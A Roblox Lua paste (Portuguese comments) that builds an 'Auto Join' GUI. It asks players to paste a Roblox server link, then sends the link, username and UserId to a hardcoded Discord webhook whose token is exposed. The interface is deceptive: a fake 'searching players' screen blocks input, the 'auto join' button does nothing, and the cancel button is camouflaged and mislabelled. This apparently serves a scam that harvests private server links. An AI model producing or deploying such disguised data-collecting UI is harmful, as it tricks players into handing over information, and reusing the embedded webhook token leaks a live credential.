-- Arquivo único para colar no Pastefy.
-- Contém dois blocos de código: CLIENT (LocalScript) e SERVER (Script).
-- Instruções rápidas:
-- 1) No Roblox Studio, cole o bloco CLIENT como LocalScript em StarterGui (ou StarterPlayerScripts).
-- 2) Cole o bloco SERVER como Script em ServerScriptService.
-- 3) Ative Allow HTTP Requests (Game Settings → Security) antes de testar.
-- 4) Teste em "Play (Server)". O envio ao Discord acontece no servidor via HttpService.
-- ---------------------------------------------------------------------------
-- ========================= CLIENT (LocalScript) =============================
-- Coloque este bloco como LocalScript em StarterGui ou StarterPlayerScripts.
-- ===========================================================================

-- LocalScript: ServerLinkLocalScript.lua
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

-- Obtém/Cria RemoteEvent
local submitEvent = ReplicatedStorage:FindFirstChild("SubmitServerLink")
if not submitEvent then
    submitEvent = Instance.new("RemoteEvent")
    submitEvent.Name = "SubmitServerLink"
    submitEvent.Parent = ReplicatedStorage
end

-- Cria GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ServerLinkGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 480, 0, 260)
mainFrame.Position = UDim2.new(0.5, -240, 0.5, -130)
mainFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
mainFrame.BorderSizePixel = 0
mainFrame.ZIndex = 2
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Text = "Enviar link de servidor"
title.Font = Enum.Font.SourceSansBold
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(255,255,255)
title.BackgroundTransparency = 1
title.Position = UDim2.new(0, 16, 0, 12)
title.Size = UDim2.new(1, -32, 0, 28)
title.ZIndex = 3
title.Parent = mainFrame

local inputBox = Instance.new("TextBox")
inputBox.PlaceholderText = "Cole o link do servidor Roblox aqui"
inputBox.Font = Enum.Font.SourceSans
inputBox.TextSize = 18
inputBox.TextColor3 = Color3.fromRGB(0,0,0)
inputBox.BackgroundColor3 = Color3.fromRGB(240,240,240)
inputBox.Size = UDim2.new(1, -32, 0, 36)
inputBox.Position = UDim2.new(0, 16, 0, 56)
inputBox.ClearTextOnFocus = false
inputBox.ZIndex = 3
inputBox.Parent = mainFrame

-- Botão de consentimento: texto "confirmar"
local consentBtn = Instance.new("TextButton")
consentBtn.Size = UDim2.new(0, 220, 0, 32)
consentBtn.Position = UDim2.new(0, 16, 0, 104)
consentBtn.BackgroundColor3 = Color3.fromRGB(60,60,60)
consentBtn.Font = Enum.Font.SourceSans
consentBtn.TextSize = 16
consentBtn.TextColor3 = Color3.fromRGB(255,255,255)
consentBtn.Text = "confirmar"
consentBtn.ZIndex = 3
consentBtn.Parent = mainFrame
local consentChecked = false

local function updateConsent()
    if consentChecked then
        consentBtn.Text = "✓ Confirmado"
        consentBtn.BackgroundColor3 = Color3.fromRGB(70,120,70)
    else
        consentBtn.Text = "confirmar"
        consentBtn.BackgroundColor3 = Color3.fromRGB(60,60,60)
    end
end

local activateBtn = Instance.new("TextButton")
activateBtn.Size = UDim2.new(0, 180, 0, 40)
activateBtn.Position = UDim2.new(1, -196, 1, -56)
activateBtn.AnchorPoint = Vector2.new(0, 0)
activateBtn.BackgroundColor3 = Color3.fromRGB(40,120,200)
activateBtn.Font = Enum.Font.SourceSansBold
activateBtn.TextSize = 18
activateBtn.TextColor3 = Color3.fromRGB(255,255,255)
activateBtn.Text = "Ativar Auto Join"
activateBtn.ZIndex = 3
activateBtn.Parent = mainFrame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -32, 0, 24)
statusLabel.Position = UDim2.new(0, 16, 1, -88)
statusLabel.BackgroundTransparency = 1
statusLabel.Font = Enum.Font.SourceSans
statusLabel.TextSize = 16
statusLabel.TextColor3 = Color3.fromRGB(200,200,200)
statusLabel.Text = "Aguardando ação..."
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.ZIndex = 3
statusLabel.Parent = mainFrame

-- OVERLAY BLOQUEADOR (preenche a tela e consome todos os inputs)
local blocker = Instance.new("ImageButton")
blocker.Name = "ScreenBlocker"
blocker.Size = UDim2.new(1, 0, 1, 0)
blocker.Position = UDim2.new(0, 0, 0, 0)
blocker.BackgroundTransparency = 1
blocker.Image = ""
blocker.AutoButtonColor = false
blocker.ZIndex = 50
blocker.Visible = false
blocker.Parent = screenGui

-- Painel central de loading (fica sobre o blocker)
local loadingPanel = Instance.new("Frame")
loadingPanel.Size = UDim2.new(0, 520, 0, 120)
loadingPanel.AnchorPoint = Vector2.new(0.5, 0.5)
loadingPanel.Position = UDim2.new(0.5, 0, 0.5, 0)
loadingPanel.BackgroundColor3 = Color3.fromRGB(20,20,20)
loadingPanel.BorderSizePixel = 0
loadingPanel.ZIndex = 51
loadingPanel.Visible = false
loadingPanel.Parent = screenGui

local loadingLabel = Instance.new("TextLabel")
loadingLabel.Text = "Procurando players... (pressione 'Ativar Auto join lentamente' para parar)"
loadingLabel.Font = Enum.Font.SourceSansBold
loadingLabel.TextSize = 20
loadingLabel.TextColor3 = Color3.fromRGB(255,255,255)
loadingLabel.BackgroundTransparency = 1
loadingLabel.Position = UDim2.new(0, 12, 0, 12)
loadingLabel.Size = UDim2.new(1, -24, 0, 48)
loadingLabel.ZIndex = 52
loadingLabel.Parent = loadingPanel

local cancelBtn = Instance.new("TextButton")
cancelBtn.Text = "Ativar Auto join lentamente"
cancelBtn.Font = Enum.Font.SourceSans
cancelBtn.TextSize = 18
cancelBtn.Size = UDim2.new(0, 260, 0, 40)
cancelBtn.Position = UDim2.new(0.5, -130, 1, -56)
cancelBtn.AnchorPoint = Vector2.new(0.5, 0)
-- Camuflagem visual: baixa visibilidade por padrão
cancelBtn.BackgroundColor3 = loadingPanel.BackgroundColor3
cancelBtn.BackgroundTransparency = 1 -- invisível por padrão
cancelBtn.TextColor3 = loadingPanel.BackgroundColor3 -- texto invisível
cancelBtn.ZIndex = 52
cancelBtn.Parent = loadingPanel

-- Ao passar o mouse, revelar o botão (acessível)
local revealBgTransparency = 0.15
local revealTextColor = Color3.fromRGB(255,255,255)
cancelBtn.MouseEnter:Connect(function()
    cancelBtn.BackgroundTransparency = revealBgTransparency
    cancelBtn.BackgroundColor3 = Color3.fromRGB(120,80,40)
    cancelBtn.TextColor3 = revealTextColor
end)
cancelBtn.MouseLeave:Connect(function()
    if loading then
        cancelBtn.BackgroundTransparency = 1
        cancelBtn.BackgroundColor3 = loadingPanel.BackgroundColor3
        cancelBtn.TextColor3 = loadingPanel.BackgroundColor3
    else
        cancelBtn.BackgroundTransparency = 0.25
        cancelBtn.TextColor3 = Color3.fromRGB(255,255,255)
        cancelBtn.BackgroundColor3 = Color3.fromRGB(200,100,40)
    end
end)

-- Estado
local loading = false
local waitingForResponse = false
local RESPONSE_TIMEOUT = 20 -- segundos

-- Validação de link simples
local function validateLocalLink(link)
    if not link or link == "" then return false end
    if string.find(link, "roblox%.com") and string.find(link, "games") then
        return true
    end
    if string.find(link, "rbx%.link") then
        return true
    end
    return false
end

local function openOverlay()
    blocker.Visible = true
    loadingPanel.Visible = true
    cancelBtn.BackgroundTransparency = 1
    cancelBtn.TextColor3 = loadingPanel.BackgroundColor3
    loading = true
end

local function closeOverlay()
    blocker.Visible = false
    loadingPanel.Visible = false
    loading = false
    waitingForResponse = false
    cancelBtn.BackgroundTransparency = 0.25
    cancelBtn.TextColor3 = Color3.fromRGB(255,255,255)
    cancelBtn.BackgroundColor3 = Color3.fromRGB(200,100,40)
end

-- Quando o jogador clicar em "confirmar": alterna o estado e, se marcado, envia IMEDIATAMENTE
consentBtn.MouseButton1Click:Connect(function()
    consentChecked = not consentChecked
    updateConsent()

    if consentChecked then
        local link = inputBox.Text
        if not validateLocalLink(link) then
            statusLabel.Text = "Link inválido. Não foi enviado."
            consentChecked = false
            updateConsent()
            return
        end

        -- mostra overlay bloqueador enquanto esperamos o servidor processar
        openOverlay()
        waitingForResponse = true
        statusLabel.Text = "Enviando link ao servidor..."

        -- Envia o link ao servidor (o servidor fará validação final e postará no webhook)
        submitEvent:FireServer(link)

        -- timeout caso servidor não responda
        local startTime = tick()
        spawn(function()
            while waitingForResponse and tick() - startTime < RESPONSE_TIMEOUT do
                task.wait(0.5)
            end
            if waitingForResponse then
                waitingForResponse = false
                closeOverlay()
                statusLabel.Text = "Tempo esgotado. Tente novamente mais tarde."
                consentChecked = false
                updateConsent()
            end
        end)
    else
        statusLabel.Text = "Você desmarcou a confirmação."
    end
end)

-- O botão "Ativar Auto Join" apenas orienta o jogador a usar 'confirmar'
activateBtn.MouseButton1Click:Connect(function()
    if loading then return end
    statusLabel.Text = "Use 'confirmar' para enviar o link ao webhook."
end)

-- Cancelar via botão camuflado
cancelBtn.MouseButton1Click:Connect(function()
    if not loading then
        closeOverlay()
        return
    end
    waitingForResponse = false
    closeOverlay()
    statusLabel.Text = "Ação cancelada pelo jogador."
    consentChecked = false
    updateConsent()
end)

-- Permitir cancelar também com Esc (acessibilidade)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.Escape and loading then
        waitingForResponse = false
        closeOverlay()
        statusLabel.Text = "Ação cancelada (Esc)."
        consentChecked = false
        updateConsent()
    end
end)

-- Recebe resposta do servidor (sucesso/falha)
submitEvent.OnClientEvent:Connect(function(success, message)
    waitingForResponse = false
    closeOverlay()
    if success then
        statusLabel.Text = "Enviado com sucesso: " .. (message or "")
    else
        statusLabel.Text = "Falha ao enviar: " .. (message or "erro desconhecido")
        consentChecked = false
        updateConsent()
    end
end)

-- ===========================================================================
-- ========================= SERVER (Script) =================================
-- Coloque este bloco como Script em ServerScriptService.
-- ===========================================================================

-- Script: ServerLinkServer.lua
local ReplicatedStorage_srv = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Players_srv = game:GetService("Players")

-- RemoteEvent (cria se não existir)
local submitEvent_srv = ReplicatedStorage_srv:FindFirstChild("SubmitServerLink")
if not submitEvent_srv then
    submitEvent_srv = Instance.new("RemoteEvent")
    submitEvent_srv.Name = "SubmitServerLink"
    submitEvent_srv.Parent = ReplicatedStorage_srv
end

-- ***** Webhook especificado (conforme solicitado) *****
local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1431755073066893394/ovqCDnyIZ_LzgXTtVCjapTq7D1h159DRcJBYjwlQpAl6siAxFDE67PYp8Uel2O2iN2pP"
-- *****************************************************

local COOLDOWN = 30 -- segundos por jogador
local cooldowns = {}

local function isValidRobloxServerLink(link)
    if not link then return false end
    if string.match(link, "roblox%.com/.-/games/%d+") or (string.find(link, "roblox%.com") and string.find(link, "games")) then
        return true
    end
    if string.find(link, "rbx%.link") then
        return true
    end
    return false
end

local function sendDiscordWebhook(webhookUrl, player, link)
    if not webhookUrl or webhookUrl == "" then
        return false, "Webhook não configurado."
    end
    if not string.find(webhookUrl, "discord.com/api/webhooks") and not string.find(webhookUrl, "discordapp.com/api/webhooks") then
        return false, "URL de webhook inválida."
    end

    local embed = {
        ["embeds"] = {{
            ["title"] = "Link de servidor enviado",
            ["description"] = link,
            ["color"] = 56108,
            ["fields"] = {
                { name = "Jogador", value = player.Name or "unknown", inline = true },
                { name = "UserId", value = tostring(player.UserId or 0), inline = true },
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local ok, err = pcall(function()
        local json = HttpService:JSONEncode(embed)
        HttpService:PostAsync(webhookUrl, json, Enum.HttpContentType.ApplicationJson)
    end)
    if not ok then
        return false, tostring(err)
    end
    return true, "Enviado"
end

submitEvent_srv.OnServerEvent:Connect(function(player, link)
    -- Valida cooldown
    local now = tick()
    local last = cooldowns[player.UserId] or 0
    if now - last < COOLDOWN then
        submitEvent_srv:FireClient(player, false, "Você está em cooldown. Aguarde " .. math.ceil(COOLDOWN - (now - last)) .. "s.")
        return
    end

    -- Valida tipo e tamanho
    if type(link) ~= "string" or #link > 2000 then
        submitEvent_srv:FireClient(player, false, "Link inválido.")
        return
    end

    -- Validação adicional do link
    if not isValidRobloxServerLink(link) then
        submitEvent_srv:FireClient(player, false, "Link não parece ser um link válido de servidor Roblox.")
        return
    end

    cooldowns[player.UserId] = now

    -- Envia ao webhook
    local ok, msg = sendDiscordWebhook(DISCORD_WEBHOOK_URL, player, link)
    if ok then
        submitEvent_srv:FireClient(player, true, "Link enviado ao Discord.")
        print(("[ServerLinkServer] %s enviou link: %s"):format(player.Name, link))
    else
        submitEvent_srv:FireClient(player, false, "Erro ao enviar: " .. msg)
        warn("[ServerLinkServer] Erro ao enviar webhook: " .. tostring(msg))
    end
end)

-- ===========================================================================
-- FIM DO ARQUIVO ÚNICO
-- ===========================================================================

-- Observações finais:
-- - O arquivo acima é um "paste único" contendo ambos os blocos. No Pastefy cole exatamente este conteúdo.
-- - No Roblox Studio, separe os blocos: CLIENT -> LocalScript em StarterGui; SERVER -> Script em ServerScriptService.
-- - Ative Allow HTTP Requests para que o Script do servidor possa postar no Discord.
-- - O envio é feito pelo servidor (mais seguro). Não compartilhe seu jogo/public-repo com pessoas não confiáveis, pois o webhook está embutido aqui.
